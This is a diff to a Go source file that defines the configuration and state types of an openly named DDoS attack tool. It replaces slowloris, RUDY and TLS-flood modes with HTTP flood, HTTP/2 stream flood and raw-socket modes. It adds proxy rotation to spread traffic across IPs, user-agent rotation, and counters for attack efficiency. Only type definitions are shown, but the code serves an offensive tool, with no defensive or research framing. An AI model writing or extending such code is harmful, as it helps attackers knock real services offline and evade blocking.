@@ -10,63 +10,36 @@ import (
 type AttackMode string
 
 const (
-	// ModeFlood sends maximum concurrent HTTP requests
+	// ModeFlood sends maximum concurrent HTTP requests (default, most efficient)
 	ModeFlood AttackMode = "flood"
-	// ModeSlowloris holds connections open with partial headers
-	ModeSlowloris AttackMode = "slowloris"
-	// ModeMixed combines flood and slowloris approaches
-	ModeMixed AttackMode = "mixed"
-	// ModeHTTP2StreamFlood floods server with HTTP/2 streams
-	ModeHTTP2StreamFlood AttackMode = "http2-stream-flood"
-	// ModeRUDY sends slow HTTP POST requests (R-U-Dead-Yet)
-	ModeRUDY AttackMode = "rudy"
-	// ModeTLSHandshakeFlood initiates many TLS handshakes without completing HTTP requests
-	ModeTLSHandshakeFlood AttackMode = "tls-handshake-flood"
+	// ModeHTTP2 floods server with HTTP/2 streams (for HTTPS targets)
+	ModeHTTP2 AttackMode = "http2"
+	// ModeRaw uses raw TCP sockets for maximum throughput (for HTTP targets)
+	ModeRaw AttackMode = "raw"
 )
 
 // DDoSConfig holds configuration for DDoS attack
 type DDoSConfig struct {
-	TargetURL        string
-	Method           string
-	Headers          map[string]string
-	Body             string
-	ContentType      string
-	MaxThreads       int
-	Duration         time.Duration
-	Timeout          time.Duration
-	AttackMode       AttackMode
-	RateLimit        int // Requests per second (0 = unlimited)
-	FollowRedirects  bool
-	ReuseConnections bool
+	// Required fields
+	TargetURL  string        // Required: Simple URL (http:// or https://)
+	Method     string        // GET, POST, etc. (default: GET)
+	Headers    map[string]string
+	Body       string
+	ContentType string
+	MaxThreads int           // Default: 500
+	Duration   time.Duration // Default: 60s
+	Timeout    time.Duration // Default: 5s
+	AttackMode AttackMode    // flood, http2, raw (default: flood)
 
-	// Slowloris specific
-	SlowlorisDelay time.Duration // Delay between partial header sends
+	// Proxy settings (optional, but highly recommended for efficiency)
+	ProxyList   []string // Auto-loaded from proxy/proxy.txt if available
+	RotateProxy bool     // Default: true (distributes load across IPs)
 
-	// Proxy settings
-	UseProxy    bool     // Whether to use proxies
-	ProxyList   []string // List of proxy URLs (e.g., "http://1.2.3.4:8080")
-	RotateProxy bool     // Rotate through proxies for each request
-
-	// User Agent settings
-	UseCustomUserAgents bool   // Whether to use custom user agents from file
-	UserAgentFilePath   string // Path to file containing custom user agents (one per line)
-
-	// TLS Attack settings
-	UseTLSAttack      bool     // Deprecated: Use AttackMode=ModeTLSHandshakeFlood instead
-	ForceTLS          bool     // Force TLS even on HTTP URLs
-	TLSHandshakeFlood bool     // Deprecated: Use AttackMode=ModeTLSHandshakeFlood instead
-	TLSRenegotiation  bool     // Force TLS renegotiation on connections (used with Slowloris)
-	TLSMinVersion     uint16   // Minimum TLS version (e.g., tls.VersionTLS10, 0 = default)
-	TLSMaxVersion     uint16   // Maximum TLS version (e.g., tls.VersionTLS13, 0 = default)
-	TLSCipherSuites   []uint16 // Specific cipher suites to use (optional, nil = default)
-
-	// HTTP/2 and Advanced settings
-	UseHTTP2          bool          // Enable HTTP/2 support
-	UsePipelining     bool          // Enable HTTP pipelining
-	AdaptiveRateLimit bool          // Enable adaptive rate limiting
-	MaxStreamsPerConn int           // Maximum HTTP/2 streams per connection (default: 100)
-	RUDYDelay         time.Duration // Delay between bytes in RUDY attack
-	RUDYBodySize      int           // Size of POST body for RUDY attack (in bytes)
+	// Advanced settings (optional, rarely needed)
+	RateLimit       int    // 0 = unlimited
+	FollowRedirects bool
+	UserAgentFile   string // Optional: custom user agents file (default: built-in rotation)
+	MaxStreamsPerConn int  // Maximum HTTP/2 streams per connection (default: 100)
 
 	// Callbacks
 	OnProgress func(stats AttackStats)
@@ -85,6 +58,10 @@ type AttackStats struct {
 	RequestsPerSec    float64
 	ActiveProxies     int
 	DisabledProxies   int
+
+	// Efficiency statistics
+	ConnectionsReused int64   // Connection reuse count
+	PoolHitRate       float64 // Connection pool efficiency (0-1)
 }
 
 // DDoSAttack represents an active DDoS attack
@@ -118,4 +95,15 @@ type DDoSAttack struct {
 	startTime time.Time
 	running   bool
 	mu        sync.Mutex
+
+	// Efficiency components (initialized when needed)
+	clientPool      interface{} // *ClientPool - connection pool manager
+	requestBuilder  interface{} // *RequestBuilder - request builder with randomization
+	rawSocketPool   interface{} // *RawSocketPool - raw socket pool (if using raw sockets)
+
+	// Pool statistics
+	poolHits        int64 // Atomic counter for pool hits
+	poolMisses      int64 // Atomic counter for pool misses
+	totalBatches    int64 // Atomic counter for total batches
+	successfulBatches int64 // Atomic counter for successful batches
 }
